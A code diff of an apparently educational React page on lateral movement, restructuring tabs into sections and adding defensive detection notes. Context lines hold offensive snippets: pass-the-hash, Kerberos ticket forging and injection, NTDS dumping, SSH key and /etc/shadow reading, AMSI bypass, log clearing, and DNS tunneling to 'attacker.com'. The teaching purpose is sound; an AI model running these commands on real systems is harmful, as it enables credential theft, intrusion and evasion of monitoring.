+                <CodeBlock
+                  language="powershell"
+                  title="Bypass Techniques"
                     code={`# MSBuild - Build and execute
 # Create payload.xml with inline task, then:
 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml
@@ -2008,16 +2201,20 @@ cmstp.exe /ni /s payload.inf
               </Accordion>
 
               <Accordion sx={accordionSx(theme.success)}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
-                  <StorageIcon sx={{ color: theme.success, mr: 1.5 }} />
-                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>GTFOBins Reference</Typography>
-                </AccordionSummary>
-                <AccordionDetails sx={{ pt: 3 }}>
-                  <Alert severity="info" sx={{ mb: 2, bgcolor: alpha(theme.info, 0.1), border: `1px solid ${alpha(theme.info, 0.3)}` }}>
-                    <strong>GTFOBins</strong> is a curated list of Unix binaries that can be exploited. <strong>LOLBAS</strong> is the Windows equivalent.
-                  </Alert>
-                  <Grid container spacing={2}>
-                    {[
+              <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
+                <StorageIcon sx={{ color: theme.success, mr: 1.5 }} />
+                <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>GTFOBins Reference</Typography>
+              </AccordionSummary>
+              <AccordionDetails sx={{ pt: 3 }}>
+                <Alert severity="info" sx={{ mb: 2, bgcolor: alpha(theme.info, 0.1), border: `1px solid ${alpha(theme.info, 0.3)}` }}>
+                  <strong>GTFOBins</strong> is a curated list of Unix binaries that can be exploited. <strong>LOLBAS</strong> is the Windows equivalent.
+                </Alert>
+                <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                  These references are valuable for defenders to understand potential abuse paths and to build allow
+                  lists, monitoring rules, and user education programs.
+                </Typography>
+                <Grid container spacing={2}>
+                  {[
                       { name: "lolbas-project.github.io", desc: "Windows LOLBins database", color: theme.info },
                       { name: "gtfobins.github.io", desc: "Unix GTFOBins database", color: theme.success },
                       { name: "filesec.io", desc: "File extension security", color: theme.warning },
@@ -2034,13 +2231,17 @@ cmstp.exe /ni /s payload.inf
               </Accordion>
 
               <Accordion sx={accordionSx(theme.warning)}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
-                  <WarningIcon sx={{ color: theme.warning, mr: 1.5 }} />
-                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>LOLBins Detection Tips</Typography>
-                </AccordionSummary>
-                <AccordionDetails sx={{ pt: 3 }}>
-                  <List dense>
-                    {lolbinDetections.map((item) => (
+              <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
+                <WarningIcon sx={{ color: theme.warning, mr: 1.5 }} />
+                <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>LOLBins Detection Tips</Typography>
+              </AccordionSummary>
+              <AccordionDetails sx={{ pt: 3 }}>
+                <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.8 }}>
+                  Detection works best when you baseline normal usage for common binaries. The tips below highlight
+                  typical signals that suggest a binary is being used for movement or persistence.
+                </Typography>
+                <List dense>
+                  {lolbinDetections.map((item) => (
                       <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
                         <ListItemIcon sx={{ minWidth: 32 }}>
                           <CheckCircleIcon sx={{ color: theme.warning, fontSize: 16 }} />
@@ -2051,12 +2252,12 @@ cmstp.exe /ni /s payload.inf
                   </List>
                 </AccordionDetails>
               </Accordion>
-            </Box>
-          </TabPanel>
+          </Paper>
+        </Box>
 
-          {/* Tab 3: Credential Attacks */}
-          <TabPanel value={tabValue} index={3}>
-            <Box sx={{ p: 3 }}>
+        {/* Section: Credential Attacks */}
+        <Box id="credential-attacks" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
               <Box sx={{ mb: 4 }}>
                 <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                   <VpnKeyIcon sx={{ color: theme.primary }} />
@@ -2066,6 +2267,10 @@ cmstp.exe /ni /s payload.inf
                 </Box>
                 <Divider sx={{ mt: 2, borderColor: theme.border }} />
               </Box>
+              <Typography sx={{ color: theme.textMuted, mb: 3, lineHeight: 1.8 }}>
+                Credential access is the fuel for most lateral movement. Understanding how credentials are reused,
+                cached, or exposed helps defenders focus on identity controls that stop movement early.
+              </Typography>
 
               <Accordion defaultExpanded sx={accordionSx(theme.primary)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
@@ -2075,6 +2280,10 @@ cmstp.exe /ni /s payload.inf
                 <AccordionDetails sx={{ pt: 3 }}>
                   <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
                     Pass-the-Hash uses NTLM hashes to authenticate without knowing the plaintext password. Works with SMB, WMI, and other NTLM protocols.
+                  </Typography>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    Detection focuses on authentication patterns that do not involve interactive logons, especially when
+                    the same hash is reused across multiple systems or from unusual source hosts.
                   </Typography>
                   <CodeBlock
                     language="bash"
@@ -2114,6 +2323,10 @@ xfreerdp /u:user /pth:HASH /v:TARGET`}
                   <Typography sx={{ color: theme.textMuted, mb: 2 }}>
                     Pass-the-Ticket injects stolen Kerberos tickets into the current session. Works with TGT or service tickets.
                   </Typography>
+                  <Typography sx={{ color: theme.textMuted, mb: 2 }}>
+                    Defenders should monitor for ticket use outside expected lifetimes or from devices that do not
+                    normally request those services.
+                  </Typography>
                   <CodeBlock
                     language="powershell"
                     title="Kerberos Ticket Attacks"
@@ -2145,6 +2358,10 @@ ticketConverter.py ticket.kirbi ticket.ccache`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Credential Dumping</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    Credential dumping typically targets memory or protected stores. Endpoint protections, least
+                    privilege, and segmentation reduce the impact if a single host is compromised.
+                  </Typography>
                   <CodeBlock
                     language="powershell"
                     title="Credential Extraction"
@@ -2182,6 +2399,10 @@ crackmapexec smb TARGET -u user -p pass --ntds`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Kerberos Attacks</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    Kerberos attacks aim to obtain or forge tickets that grant access without a password prompt.
+                    Monitoring service ticket requests and protecting key accounts is critical.
+                  </Typography>
                   <Grid container spacing={2} sx={{ mb: 3 }}>
                     {[
                       { title: "Kerberoasting", desc: "Request TGS, crack offline", color: theme.primary },
@@ -2224,6 +2445,10 @@ ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain DOMAIN -spn ci
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Token Manipulation</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    Token misuse often appears as privilege escalation without a corresponding login. Monitor token
+                    creation events and watch for sudden shifts in access scope on a host.
+                  </Typography>
                   <CodeBlock
                     language="powershell"
                     title="Token Impersonation"
@@ -2254,6 +2479,10 @@ Rubeus.exe ptt /luid:0x123456 /ticket:ticket.kirbi`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Detection Signals</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    These signals are most effective when correlated with identity and device baselines. Single events
+                    can be noisy, but combined signals are strong indicators of credential abuse.
+                  </Typography>
                   <List dense>
                     {credentialDetection.map((item) => (
                       <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
@@ -2266,12 +2495,12 @@ Rubeus.exe ptt /luid:0x123456 /ticket:ticket.kirbi`}
                   </List>
                 </AccordionDetails>
               </Accordion>
-            </Box>
-          </TabPanel>
+          </Paper>
+        </Box>
 
-          {/* Tab 4: Linux/SSH */}
-          <TabPanel value={tabValue} index={4}>
-            <Box sx={{ p: 3 }}>
+        {/* Section: Linux/SSH */}
+        <Box id="linux-ssh" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
               <Box sx={{ mb: 4 }}>
                 <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                   <StorageIcon sx={{ color: theme.primary }} />
@@ -2281,6 +2510,10 @@ Rubeus.exe ptt /luid:0x123456 /ticket:ticket.kirbi`}
                 </Box>
                 <Divider sx={{ mt: 2, borderColor: theme.border }} />
               </Box>
+              <Typography sx={{ color: theme.textMuted, mb: 3, lineHeight: 1.8 }}>
+                Linux lateral movement often relies on SSH for both interactive access and tunneling. Defenders should
+                watch for new SSH relationships, unusual key usage, and unexpected jump host behavior.
+              </Typography>
 
               <Accordion defaultExpanded sx={accordionSx(theme.success)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
@@ -2288,6 +2521,10 @@ Rubeus.exe ptt /luid:0x123456 /ticket:ticket.kirbi`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>SSH Tunneling & Port Forwarding</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    SSH tunnels can legitimately support remote administration, but they also obscure where traffic
+                    truly originates. Network monitoring should include tunnel endpoints and related authentication logs.
+                  </Typography>
                   <CodeBlock
                     language="bash"
                     title="SSH Tunneling Techniques"
@@ -2317,14 +2554,18 @@ autossh -M 0 -f -N -D 1080 user@jump-host`}
               </Accordion>
 
               <Accordion sx={accordionSx(theme.warning)}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
-                  <VpnKeyIcon sx={{ color: theme.warning, mr: 1.5 }} />
-                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>SSH Key Harvesting</Typography>
-                </AccordionSummary>
-                <AccordionDetails sx={{ pt: 3 }}>
-                  <CodeBlock
-                    language="bash"
-                    title="Finding SSH Keys"
+              <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
+                <VpnKeyIcon sx={{ color: theme.warning, mr: 1.5 }} />
+                <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>SSH Key Harvesting</Typography>
+              </AccordionSummary>
+              <AccordionDetails sx={{ pt: 3 }}>
+                <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                  Key exposure often happens through misconfigured home directories or reused keys. Regular key rotation
+                  and restrictive file permissions reduce the risk of lateral reuse.
+                </Typography>
+                <CodeBlock
+                  language="bash"
+                  title="Finding SSH Keys"
                     code={`# Common SSH key locations
 cat ~/.ssh/id_rsa
 cat ~/.ssh/id_ecdsa
@@ -2356,14 +2597,18 @@ ls -la /tmp/ssh-*`}
               </Accordion>
 
               <Accordion sx={accordionSx(theme.info)}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
-                  <TerminalIcon sx={{ color: theme.info, mr: 1.5 }} />
-                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Remote Execution Methods</Typography>
-                </AccordionSummary>
-                <AccordionDetails sx={{ pt: 3 }}>
-                  <CodeBlock
-                    language="bash"
-                    title="Linux Remote Execution"
+              <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
+                <TerminalIcon sx={{ color: theme.info, mr: 1.5 }} />
+                <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Remote Execution Methods</Typography>
+              </AccordionSummary>
+              <AccordionDetails sx={{ pt: 3 }}>
+                <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                  Remote execution is a standard admin task, so detection relies on context. Look for new source hosts,
+                  unexpected user accounts, or spikes in remote commands across many systems.
+                </Typography>
+                <CodeBlock
+                  language="bash"
+                  title="Linux Remote Execution"
                     code={`# SSH command execution
 ssh user@target "whoami; hostname; id"
 ssh -i key.pem user@target "cat /etc/shadow"
@@ -2391,13 +2636,17 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'`}
               </Accordion>
 
               <Accordion sx={accordionSx(theme.primary)}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
-                  <SecurityIcon sx={{ color: theme.primary, mr: 1.5 }} />
-                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Credential Locations</Typography>
-                </AccordionSummary>
-                <AccordionDetails sx={{ pt: 3 }}>
-                  <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.primary, 0.2)}` }}>
-                    <Table size="small">
+              <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
+                <SecurityIcon sx={{ color: theme.primary, mr: 1.5 }} />
+                <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Credential Locations</Typography>
+              </AccordionSummary>
+              <AccordionDetails sx={{ pt: 3 }}>
+                <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                  These files are sensitive and should be protected. Monitoring access to them helps detect credential
+                  theft attempts or misconfigured permissions.
+                </Typography>
+                <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.primary, 0.2)}` }}>
+                  <Table size="small">
                       <TableHead>
                         <TableRow sx={{ bgcolor: alpha(theme.primary, 0.1) }}>
                           <TableCell sx={{ color: theme.primary, fontWeight: 700 }}>File</TableCell>
@@ -2470,12 +2719,12 @@ ssh -S /path/to/socket target`}
                   </List>
                 </AccordionDetails>
               </Accordion>
-            </Box>
-          </TabPanel>
+          </Paper>
+        </Box>
 
-          {/* Tab 5: Cloud Pivoting */}
-          <TabPanel value={tabValue} index={5}>
-            <Box sx={{ p: 3 }}>
+        {/* Section: Cloud Pivoting */}
+        <Box id="cloud-pivoting" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
               <Box sx={{ mb: 4 }}>
                 <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                   <CloudIcon sx={{ color: theme.primary }} />
@@ -2485,6 +2734,10 @@ ssh -S /path/to/socket target`}
                 </Box>
                 <Divider sx={{ mt: 2, borderColor: theme.border }} />
               </Box>
+              <Typography sx={{ color: theme.textMuted, mb: 3, lineHeight: 1.8 }}>
+                Cloud environments shift lateral movement from network hops to identity and role changes. Monitoring
+                account activity, role assumptions, and token usage becomes the primary way to spot movement.
+              </Typography>
 
               <Accordion defaultExpanded sx={accordionSx(theme.warning)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
@@ -2492,6 +2745,10 @@ ssh -S /path/to/socket target`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>AWS Lateral Movement</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    In AWS, movement typically appears as new role assumptions, unusual API calls, or access from
+                    service identities that do not match expected workloads.
+                  </Typography>
                   <CodeBlock
                     language="bash"
                     title="AWS Pivoting Techniques"
@@ -2530,6 +2787,10 @@ aws lambda invoke --function-name FUNC_NAME output.txt`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Azure Lateral Movement</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    Azure movement often relies on token reuse, managed identities, and role assignments. Focus on
+                    new access paths that emerge after identity changes.
+                  </Typography>
                   <CodeBlock
                     language="bash"
                     title="Azure Pivoting"
@@ -2563,6 +2824,10 @@ az role assignment list`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>GCP Lateral Movement</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    GCP movement typically shows up as service account impersonation or unexpected access to storage
+                    and compute APIs. Audit logs are essential for visibility.
+                  </Typography>
                   <CodeBlock
                     language="bash"
                     title="GCP Pivoting"
@@ -2593,6 +2858,10 @@ gsutil ls gs://bucket-name`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Container Escape & Kubernetes</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    Container escape paths are usually the result of misconfiguration or over-privileged workloads.
+                    Hardened runtime policies and least privilege service accounts reduce exposure.
+                  </Typography>
                   <CodeBlock
                     language="bash"
                     title="Container Lateral Movement"
@@ -2683,6 +2952,10 @@ chroot /mnt`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Cloud Telemetry to Review</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    Cloud movement is heavily API driven, so your audit logs are the primary evidence trail. Ensure
+                    retention, centralization, and alerting for high-risk actions.
+                  </Typography>
                   <List dense>
                     {cloudTelemetry.map((item) => (
                       <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
@@ -2695,12 +2968,12 @@ chroot /mnt`}
                   </List>
                 </AccordionDetails>
               </Accordion>
-            </Box>
-          </TabPanel>
+          </Paper>
+        </Box>
 
-          {/* Tab 6: Evasion */}
-          <TabPanel value={tabValue} index={6}>
-            <Box sx={{ p: 3 }}>
+        {/* Section: Evasion */}
+        <Box id="evasion" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
               <Box sx={{ mb: 4 }}>
                 <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                   <BugReportIcon sx={{ color: theme.primary }} />
@@ -2714,6 +2987,10 @@ chroot /mnt`}
               <Alert severity="warning" sx={{ mb: 4, bgcolor: alpha(theme.warning, 0.1), border: `1px solid ${alpha(theme.warning, 0.3)}` }}>
                 Evasion techniques help avoid detection during lateral movement. Always ensure proper authorization.
               </Alert>
+              <Typography sx={{ color: theme.textMuted, mb: 3, lineHeight: 1.8 }}>
+                From a defensive perspective, this section explains why detections can fail and which gaps are most
+                commonly exploited. Use the concepts to strengthen monitoring rather than to bypass controls.
+              </Typography>
 
               <Accordion defaultExpanded sx={accordionSx(theme.primary)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
@@ -2721,6 +2998,10 @@ chroot /mnt`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>EDR/AV Evasion Concepts</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    These concepts describe how attackers attempt to blend in. Defenders can counter by correlating
+                    endpoint telemetry with identity and network signals.
+                  </Typography>
                   <Grid container spacing={2} sx={{ mb: 3 }}>
                     {[
                       { title: "Living off the Land", desc: "Use built-in tools to blend in", color: theme.info },
@@ -2745,6 +3026,10 @@ chroot /mnt`}
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>AMSI & ETW Bypass</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    The best defense is layered visibility. Even if script-level telemetry is reduced, network and
+                    authentication logs can still reveal suspicious behavior.
+                  </Typography>
                   <CodeBlock
                     language="powershell"
                     title="PowerShell Evasion"
@@ -2771,6 +3056,10 @@ $settings.SetValue($null, @{})
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Log Evasion & Cleanup</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    Log tampering is itself a high-signal event. Alert on log clearing, configuration changes, and
+                    unexpected gaps in telemetry.
+                  </Typography>
                   <CodeBlock
                     language="powershell"
                     title="Log Management"
@@ -2864,12 +3153,12 @@ iodine -f attacker.com
                   </Grid>
                 </AccordionDetails>
               </Accordion>
-            </Box>
-          </TabPanel>
+          </Paper>
+        </Box>
 
-          {/* Tab 7: Tools */}
-          <TabPanel value={tabValue} index={7}>
-            <Box sx={{ p: 3 }}>
+        {/* Section: Tools */}
+        <Box id="tools" sx={{ mt: 4, scrollMarginTop: 80 }}>
+          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
               <Box sx={{ mb: 4 }}>
                 <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                   <BuildIcon sx={{ color: theme.primary }} />
@@ -2879,6 +3168,10 @@ iodine -f attacker.com
                 </Box>
                 <Divider sx={{ mt: 2, borderColor: theme.border }} />
               </Box>
+              <Typography sx={{ color: theme.textMuted, mb: 3, lineHeight: 1.8 }}>
+                Tool awareness helps defenders recognize activity patterns and artifacts. This reference is for
+                identification and monitoring so teams can map logs to known tooling behaviors.
+              </Typography>
 
               <Accordion defaultExpanded sx={accordionSx(theme.primary)}>
                 <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
@@ -2886,6 +3179,10 @@ iodine -f attacker.com
                   <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Essential Tools Matrix</Typography>
                 </AccordionSummary>
                 <AccordionDetails sx={{ pt: 3 }}>
+                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
+                    Use this list to understand what tools might appear in incidents and what telemetry they generate.
+                    Build detections around behaviors rather than specific binaries.
+                  </Typography>
                   <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.primary, 0.2)}` }}>
                     <Table size="small">
                       <TableHead>
@@ -3098,9 +3395,10 @@ proxychains crackmapexec smb TARGET`}
                   />
                 </AccordionDetails>
               </Accordion>
-            </Box>
-          </TabPanel>
-        </Paper>
+          </Paper>
+        </Box>
+
+        {/* Section: Quiz */}
         <Paper
           id="quiz-section"
           sx={{
@@ -3108,6 +3406,7 @@ proxychains crackmapexec smb TARGET`}
             p: 4,
             borderRadius: 3,
             border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
+            scrollMarginTop: 80,
           }}
         >
           <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
@@ -3122,6 +3421,8 @@ proxychains crackmapexec smb TARGET`}
             questionsPerQuiz={QUIZ_QUESTION_COUNT}
           />
         </Paper>
+
+        {/* Bottom Navigation */}
         <Box sx={{ mt: 4, textAlign: "center" }}>
           <Button
             variant="outlined"
@@ -3132,8 +3433,71 @@ proxychains crackmapexec smb TARGET`}
             Back to Learning Hub
           </Button>
         </Box>
+          </Grid>
+        </Grid>
       </Container>
     </Box>
+
+        {/* Mobile Drawer */}
+        <Drawer
+          anchor="left"
+          open={navDrawerOpen}
+          onClose={() => setNavDrawerOpen(false)}
+          sx={{
+            display: { xs: "block", md: "none" },
+            "& .MuiDrawer-paper": {
+              width: 280,
+              bgcolor: theme.bgDark,
+              borderRight: `1px solid ${alpha(theme.primary, 0.2)}`,
+            },
+          }}
+        >
+          <Box sx={{ p: 2 }}>
+            <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
+              <Typography variant="h6" sx={{ fontWeight: 700, color: theme.primary }}>
+                Navigation
+              </Typography>
+              <IconButton onClick={() => setNavDrawerOpen(false)} sx={{ color: theme.textMuted }}>
+                <CloseIcon />
+              </IconButton>
+            </Box>
+            {sidebarNav}
+          </Box>
+        </Drawer>
+
+        {/* Mobile FABs */}
+        {isMobile && (
+          <>
+            <Fab
+              size="small"
+              onClick={() => setNavDrawerOpen(true)}
+              sx={{
+                position: "fixed",
+                bottom: 80,
+                right: 16,
+                bgcolor: alpha(theme.primary, 0.2),
+                color: theme.primary,
+                "&:hover": { bgcolor: alpha(theme.primary, 0.3) },
+              }}
+            >
+              <ListAltIcon />
+            </Fab>
+            <Fab
+              size="small"
+              onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
+              sx={{
+                position: "fixed",
+                bottom: 16,
+                right: 16,
+                bgcolor: alpha(theme.primary, 0.2),
+                color: theme.primary,
+                "&:hover": { bgcolor: alpha(theme.primary, 0.3) },
+              }}
+            >
+              <KeyboardArrowUpIcon />
+            </Fab>
+          </>
+        )}
     </LearnPageLayout>
   );
 };
